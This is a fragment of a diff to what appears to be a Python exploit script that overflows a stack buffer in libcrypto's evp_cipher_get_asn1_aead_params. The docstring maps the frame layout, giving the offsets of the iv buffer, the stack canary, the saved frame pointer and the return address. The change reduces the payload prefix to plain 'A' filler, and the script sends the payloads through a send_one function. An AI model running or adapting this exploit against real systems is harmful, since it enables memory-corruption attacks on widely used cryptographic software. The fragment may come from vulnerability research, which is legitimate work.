@@ -15,15 +15,14 @@ D = int(sys.argv[3])
 
 
 def base(n):
-    """Fill D bytes from aparams.iv to the canary.
+    """Payload prefix of n bytes.
 
-    First 16 bytes are the IV; bytes 16..19 are iv_len, 20..23 tag_len;
-    the rest is harmless filler overwritten before the epilogue.
+    D=16 targets the stock libcrypto function's own local iv[]:
+      libcrypto evp_cipher_get_asn1_aead_params (0x1d0cf0)
+        local iv = sp+8, canary = sp+24, saved x29 = sp+32, LR = sp+40
+      so from the copied iv: canary at +16, x29 at +24, LR at +32.
     """
-    head = b"A" * 16 + struct.pack("<II", 12, 16)
-    if n <= len(head):
-        return head[:n]
-    return head + b"B" * (n - len(head))
+    return b"A" * n
 
 
 def send_one(payload, timeout=8):
